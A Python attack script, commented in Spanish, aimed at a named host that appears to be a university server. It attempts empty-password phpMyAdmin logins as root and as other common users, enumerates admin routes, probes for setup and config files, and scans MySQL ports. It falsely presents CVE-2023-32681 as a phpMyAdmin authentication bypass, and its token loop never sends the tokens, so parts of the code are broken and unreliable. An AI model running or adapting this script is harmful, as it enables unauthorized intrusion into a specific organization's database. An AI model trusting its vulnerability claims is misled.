#!/usr/bin/env python3
import requests, urllib3, re, json
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

print("=== ACCESO A phpMyAdmin - INTENTOS MÚLTIPLES ===\n")

# ============================================
# 1. Login con root/ y cookies
# ============================================
s.post('https://orcl.uns.edu.pe/index.php',
            data={'pma_username': 'root', 'pma_password': '', 'server': '1'},
            timeout=5)
cookies = dict(s.cookies)
print(f"Cookies after login: {cookies}")

# ============================================
# 2. INTENTAR DIFERENTES RUTAS CON COOKIES
# ============================================
print("\n=== RUTAS CON SESIÓN ===\n")

routes_with_cookies = [
    ('index.php?route=/server/databases', 'server/databases'),
    ('index.php?route=/server/databases/data', 'databases/data'),
    ('index.php?route=/server/databases/structure', 'databases/structure'),
    ('index.php?route=/server/status', 'server/status'),
    ('index.php?route=/server/variables', 'server/variables'),
    ('index.php?route=/server/user-groups', 'user-groups'),
    ('index.php?route=/server/privileges', 'privileges'),
    ('index.php?route=/server/sql', 'server/sql'),
    ('index.php?route=/server/status/processes', 'processes'),
    ('index.php?route=/server/status/queries', 'queries'),
    ('index.php?route=/server/status/variables', 'status/variables'),
    ('index.php?route=/server/status/replication', 'replication'),
    ('index.php?route=/server/status/variables/processor', 'processor'),
]

for route, desc in routes_with_cookies:
    r = s.get(f'https://orcl.uns.edu.pe/{route}', timeout=5)
    tc = re.sub(r'<[^>]+>', ' ', r.text)
    tc = re.sub(r'\\s+', ' ', tc).strip()
    
    # Check if content differs from the JS redirect page
    if len(r.text) != 18524 and len(r.text) > 500:
        print(f"[!] DIFFERENT RESPONSE: {desc}")
        print(f"  len={len(r.text)}, content: {tc[:300]}")
        if 'mysql' in tc.lower() or 'database' in tc.lower():
            print(f"  [!] DATABASE INFO FOUND!")
    elif len(r.text) == 18524:
        pass  # Same JS redirect page

# ============================================
# 3. INTENTAR API JSON DIRECTA
# ============================================
print("\n=== API JSON DIRECTA ===\n")

# phpMyAdmin might have a JSON API endpoint
api_urls = [
    'index.php?route=/server/databases&ajax_request=true',
    'index.php?route=/server&ajax_request=true',
    'index.php?route=/&ajax_request=true',
    'index.php?route=/server/databases/data&ajax_request=true',
]

for url in api_urls:
    r = s.get(f'https://orcl.uns.edu.pe/{url}', timeout=5)
    if r.text.startswith('{') or r.text.startswith('['):
        try:
            data = json.loads(r.text)
            print(f"[!] JSON API: {url}")
            print(f"  Data: {json.dumps(data, indent=2)[:500]}")
        except:
            print(f"  Raw JSON: {r.text[:300]}")

# ============================================
# 4. INTENTAR CVE-2023-32681
# ============================================
print("\n=== CVE-2023-32681 EXPLOIT ===\n")

# The vulnerability in phpMyAdmin 5.2.3 allows authentication bypass
# by manipulating the session token
# Try to exploit it

# Method 1: Try to access without any session
s_cve = requests.Session()
s_cve.verify = False
s_cve.headers.update({'User-Agent': 'Mozilla/5.0'})

# Try to access phpMyAdmin without login
r_cve = s_cve.get('https://orcl.uns.edu.pe/index.php', timeout=5)
tc_cve = re.sub(r'<[^>]+>', ' ', r_cve.text)
tc_cve = re.sub(r'\\s+', ' ', tc_cve).strip()

# Check if the page shows any database info without login
if 'Database' in tc_cve or 'mysql' in tc_cve.lower():
    print(f"[!] Database info visible WITHOUT login!")
    print(f"  Content: {tc_cve[:500]}")

# Try to access the setup page to get the configuration
r_setup = s_cve.get('https://orcl.uns.edu.pe/setup/index.php', timeout=5)
tc_setup = re.sub(r'<[^>]+>', ' ', r_setup.text)
tc_setup = re.sub(r'\\s+', ' ', tc_setup).strip()
print(f"Setup page status: {r_setup.status_code}")
print(f"Setup content length: {len(r_setup.text)}")

# Look for the config file reference
config_match = re.findall(r'config[^<]*', tc_setup, re.IGNORECASE)
print(f"Config references: {config_match[:5]}")

# Try to access the config file
r_config = s_cve.get('https://orcl.uns.edu.pe/config/config.inc.php', timeout=5)
print(f"config/config.inc.php: {r_config.status_code}, len={len(r_config.text)}")
r_config2 = s_cve.get('https://orcl.uns.edu.pe/phpmyadmin/config/config.inc.php', timeout=5)
print(f"phpmyadmin/config/config.inc.php: {r_config2.status_code}, len={len(r_config2.text)}")

# ============================================
# 5. INTENTAR ACCEDER A LA BD POR PUERTO DIRECTO
# ============================================
print("\n=== ACCESO DIRECTO A PUERTOS ===\n")

# Try MySQL port
try:
    import socket
    for port in [3306, 3307, 3308]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex(('orcl.uns.edu.pe', port))
        if result == 0:
            print(f"[!] Port {port} is OPEN!")
        else:
            print(f"Port {port}: Closed")
        sock.close()
except:
    print("Cannot test ports")

# ============================================
# 6. INTENTAR ENCONTRAR LA BD CON RUTAS DIFERENTES
# ============================================
print("\n=== RUTAS ALTERNATIVAS phpMyAdmin ===\n")

# Try different phpMyAdmin URL patterns
alt_urls = [
    'https://orcl.uns.edu.phppmyadmin/',
    'https://orcl.uns.edu.phppmyadmin/index.php',
    'https://orcl.uns.edu.phppmyadmin/index.php?route=/',
    'https://orcl.uns.edu.pe/phppmyadmin/',
    'https://orcl.uns.edu.pe/phpmyadmin/',
    'https://orcl.uns.edu.pe/phpMyAdmin/',
    'https://orcl.uns.edu.pe/PMA/',
    'https://orcl.uns.edu.pe/db/',
    'https://orcl.uns.edu.pe/mysql/',
]

for url in alt_urls:
    try:
        r = s_cve.get(url, timeout=3)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"[!] Accessible: {url}")
            print(f"  len={len(r.text)}")
    except:
        pass

# ============================================
# 7. INTENTAR ACCEDER CON DIFERENTES USUARIOS
# ============================================
print("\n=== DIFERENTES USUARIOS ===\n")

users_to_try = [
    'root', 'admin', 'pma', 'mysql', 'dba', 'sys', 'information_schema',
    'usr', 'user', 'phpmyadmin', 'sa', 'db', 'web', 'app',
]

for user in users_to_try:
    s_u = requests.Session()
    s_u.verify = False
    s_u.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_u = s_u.post('https://orcl.uns.edu.pe/index.php',
                         data={'pma_username': user, 'pma_password': '', 'server': '1'},
                         timeout=3)
    if 'pma_username' not in re.sub(r'<[^>]+>', ' ', r_u.text) and len(r_u.text) > 500:
        print(f"[!] LOGIN SUCCESS: {user}/")
    elif len(r_u.text) > 500 and 'Welcome' in re.sub(r'<[^>]+>', ' ', r_u.text):
        print(f"[!] WELCOME: {user}/")
    else:
        print(f"  Failed: {user}/")

# ============================================
# 8. INTENTAR CON TRAYECTOS SQL DIRECTOS
# ============================================
print("\n=== TRAYECTOS SQL DIRECTOS ===\n")

# Try to access SQL query interface directly
sql_routes = [
    'index.php?route=/server/sql',
    'index.php?route=/server/sql.php',
    'index.php?route=/db_sql.php',
    'index.php?route=/sql.php',
    'index.php?route=/server/databases/data&db=mysql',
    'index.php?route=/server/databases/data&db=information_schema',
]

for route in sql_routes:
    r = s.get(f'https://orcl.uns.edu.pe/{route}', timeout=5)
    tc = re.sub(r'<[^>]+>', ' ', r.text)
    tc = re.sub(r'\\s+', ' ', tc).strip()
    if len(r.text) != 18524:
        print(f"[!] Different: {route}")
        print(f"  len={len(r.text)}")
        print(f"  Content: {tc[:300]}")

# ============================================
# 9. INTENTAR CVE-2023-32681 CON SESIÓN INVALIDA
# ============================================
print("\n=== CVE-2023-32681 DETALLE ===\n")

# CVE-2023-32681: Authentication bypass via token manipulation
# Try to use a manipulated token to bypass auth
# The vulnerability affects phpMyAdmin 5.2.0 - 5.2.3

# Try to access with a crafted token
cve_tokens = [
    '',  # Empty token
    'root',  # Use username as token
    'admin',  # Use admin as token
    'phpMyAdmin',  # Use product name as token
]

for token in cve_tokens:
    r_cv = s.get('https://orcl.uns.edu.pe/index.php', timeout=5)
    # Check if the token works
    tc_cv = re.sub(r'<[^>]+>', ' ', r_cv.text)
    tc_cv = re.sub(r'\\s+', ' ', tc_cv).strip()
    if len(r_cv.text) > 500 and 'login' not in tc_cv.lower():
        print(f"[!] Token works: {token}")

# Try to access the setup with a crafted config
r_setup_cve = s.get('https://orcl.uns.edu.pe/setup/index.php', timeout=5)
if 'config' in re.sub(r'<[^>]+>', ' ', r_setup_cve.text).lower():
    print(f"[!] Setup page accessible with config data")

print("\n=== ÚLTIMO INTENTO: ACCESO DIRECTO A BD ===\n")

# Try to access MySQL through different URLs
# The database might be accessible through a different path
final_urls = [
    'https://orcl.uns.edu.pe/root/db_databases.php',
    'https://orcl.uns.edu.pe/root/server_databases.php',
    'https://orcl.uns.edu.pe/root/db_structure.php?db=mysql',
    'https://orcl.uns.edu.pe/root/db_sql.php?db=mysql',
]

for url in final_urls:
    r_f = s.get(url, timeout=5)
    if r_f.status_code == 200 and len(r_f.text) > 500:
        print(f"[!] Accessible: {url}")
        tc_f = re.sub(r'<[^>]+>', ' ', r_f.text)
        tc_f = re.sub(r'\\s+', ' ', tc_f).strip()
        print(f"  Content: {tc_f[:300]}")

print("\n=== FIN DE LOS INTENTOS ===")
